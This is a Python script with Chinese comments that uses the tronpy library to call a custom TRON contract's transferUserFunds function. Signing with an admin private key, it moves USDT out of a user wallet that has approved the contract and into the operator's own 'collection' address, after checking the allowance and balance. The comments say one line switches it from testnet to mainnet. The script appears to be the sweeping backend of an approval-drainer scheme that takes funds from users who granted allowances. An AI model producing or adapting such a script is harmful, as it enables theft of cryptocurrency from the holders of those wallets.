import logging
import time
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.contract import Contract

"""
这个脚本是测试网环境 
上线时只需要把 client = Tron(network='nile') 改成 client = Tron(network='mainnet') 即可

安装依赖 pip install tronpy

不想用tronpy的，可以自行实现一个极简的 Protobuf 序列化工具，本地构造交易结构时使用wallet/getnowblock接口获取当前区块信息，本地签名，将最终签名好的Hex使用wallet/broadcasthex广播上链

本地构造交易+签名 有上手难度
新手直接用三方依赖库tronpy即可
"""


# 1. 管理员地址 (部署合约的地址 )
ADMIN_ADDRESS = "部署合约的地址"

# 2. 管理员地址私钥（不是助记词！）
ADMIN_PRIVATE_KEY = "部署合约的地址私钥"

# 3. 部署成功获得的合约地址（Tron给你的合约地址）
MANAGER_CONTRACT_ADDRESS = "你的合约地址"

# 4. 授权成功的用户地址 (划转该地址的USDT)
USER_ADDRESS = "用户的地址"

# 5. 归集地址（划转用户的USDT到该地址）
TARGET_ADDRESS = "你的归集地址"

# 6. 转出的 USDT 金额 (无需加6个0，该脚本会自动处理精度)
TRANSFER_AMOUNT_USDT = 10.5  # 例如转出 10.5 U



logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)



# 根据部署的合约来定义极简合约 ABI (确保即使合约在TronScan未验证也能成功调用)
MANAGER_ABI = [
    {"inputs": [{"internalType": "address", "name": "user", "type": "address"}], "name": "getUserAllowance", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "user", "type": "address"}], "name": "getUserBalance", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"internalType": "address", "name": "from", "type": "address"}, {"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transferUserFunds", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
]



def main():
    logger.info("启动授权合约自动归集脚本...")
    
    try:
        # 连接波场 主网mainnet  测试网nile
        client = Tron(network='nile')
        priv_key = PrivateKey(bytes.fromhex(ADMIN_PRIVATE_KEY))
        
        # 实例化管理合约 (带入定义好的合约 ABI 防止未经验证报错)
        contract = Contract(addr=MANAGER_CONTRACT_ADDRESS, abi=MANAGER_ABI, client=client)
        
        # 处理 USDT 的 6 位小数精度
        amount_in_sun = int(TRANSFER_AMOUNT_USDT * 1_000_000)
        logger.info(f"正在从 {USER_ADDRESS} 转出 {TRANSFER_AMOUNT_USDT} USDT 到归集地址 {TARGET_ADDRESS}")

        # 自动检查授权额度
        logger.info("正在检查用户地址的授权额度...")
        allowance = contract.functions.getUserAllowance(USER_ADDRESS)
        logger.info(f"用户地址当前已授权额度: {allowance / 1_000_000} USDT")
        
        if allowance < amount_in_sun:
            logger.error("❌ 拦截操作：用户授权给本合约的额度不足，无法执行转账！")
            return
            
        # 自动检查用户地址的实际USDT余额
        logger.info("正在检查用户地址USDT余额...")
        balance = contract.functions.getUserBalance(USER_ADDRESS)
        logger.info(f"用户地址当前实际余额: {balance / 1_000_000} USDT")
        
        if balance < amount_in_sun:
            logger.error("拦截操作：用户的 USDT 余额不足以本次转账！")
            return

        # 管理员私钥签名并执行转出
        logger.info("通过全部检查！正在构建 transferUserFunds 交易并使用管理员私钥签名...")
        
        txn = (
            contract.functions.transferUserFunds(USER_ADDRESS, TARGET_ADDRESS, amount_in_sun)
            .with_owner(ADMIN_ADDRESS)
            .fee_limit(100_000_000)
            .build()
            .sign(priv_key)
        )
        
        # 广播交易
        result = txn.broadcast()
        
        if result and result.get("result"):
            txid = result.get("txid")
            logger.info("交易广播成功！")
            logger.info(f"交易 Hash (TXID): {txid}")
            logger.info(f"TronScan 链接: https://nile.tronscan.org/#/transaction/{txid}")
        else:
            logger.error(f"⚠️ 广播失败，节点返回信息: {result}")

    except Exception as e:
        logger.error(f"发生异常错误: {e}")

if __name__ == "__main__":
    main()
